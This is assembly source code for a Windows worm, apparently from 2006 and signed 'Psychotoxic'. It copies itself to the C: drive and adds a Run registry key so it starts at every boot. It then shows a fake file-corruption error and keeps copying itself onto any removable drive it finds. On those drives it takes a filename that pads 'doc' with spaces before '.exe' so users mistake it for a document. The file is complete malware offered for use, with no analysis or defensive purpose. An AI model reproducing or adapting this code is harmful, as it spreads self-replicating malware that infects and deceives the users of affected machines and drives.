;Created by berniee (fakedminded 2006) dont remove this!!

.586
.model flat,stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
include \masm32\include\advapi32.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\advapi32.lib

.data


copyright db "I am a fake!",0
signature db "Psychotoxic",0
start_key    db     'msconf', 0
run_services db     'software\Microsoft\Windows\CurrentVersion\Run',0
kinky_wife db "doc                                                                                               .exe",0


root_file db "c:\win32_alfa.exe",0
extend_1 db " -ins",0

ErrMsg db "Invalid Path or File Name",3,10,"The cureent File/Path is corrupted",0

drive_letter db "a:\",0

.data?
sz_buffer_keyname_e_e dd ?
buffer db 256 dup(?)
vol_buffer db 256 dup(?)
reg_handle dd ?
length_tchar dd ?

.code
start:

invoke CreateMutex,NULL,TRUE,offset signature
cmp eax,0
je exit_shit
invoke GetLastError
cmp eax,ERROR_ALREADY_EXISTS
je exit_shit

invoke GetCommandLine

mov ecx,100
seek_truth:
cmp word ptr [eax],'sni-'
je sleep_
inc eax
loop seek_truth

invoke GetModuleFileName,0,offset buffer,256
mov length_tchar,eax

call install
call drop_in_removeable
invoke FatalAppExit,0,offset ErrMsg
invoke ExitProcess,0

sleep_:
call drop_in_removeable

exit_shit:
invoke ExitProcess,0


install:

invoke CopyFile,offset buffer,offset root_file,FALSE
invoke RegOpenKeyEx,HKEY_LOCAL_MACHINE,offset run_services,0,KEY_ALL_ACCESS,offset reg_handle
cmp eax,0
jne exit_install
mov sz_buffer_keyname_e_e,sizeof root_file
add sz_buffer_keyname_e_e,5
invoke lstrcpy,offset buffer,offset root_file
invoke lstrcat,offset buffer,offset extend_1

invoke RegSetValueEx,reg_handle,addr start_key,0,REG_SZ,offset buffer,  sz_buffer_keyname_e_e
invoke RegCloseKey,reg_handle

ret
exit_install:
xor eax,eax
ret

drop_in_removeable:


flash_dropper:
.data?
instant_buffer dd ?
.code

invoke GlobalAlloc,0,256
mov instant_buffer,eax
invoke GetModuleFileName,0,offset buffer,256
mov length_tchar,eax

invoke GetLogicalDriveStrings,256,offset vol_buffer
mov ebp,offset vol_buffer

_back:

invoke GetDriveType,ebp

.if eax==DRIVE_REMOVABLE;DRIVE_RAMDISK;
.if byte ptr [ebp] !='A' ;|| byte ptr [ebp]!='a'

invoke lstrcpy,offset instant_buffer,ebp
invoke lstrcat,offset instant_buffer,offset kinky_wife
invoke CopyFile,offset buffer,offset instant_buffer,FALSE

.endif

.endif

add ebp,4
cmp byte ptr [ebp+1],0
je sleep_now


jmp _back
sleep_now:

invoke Sleep,1000
jmp flash_dropper

ret
end start

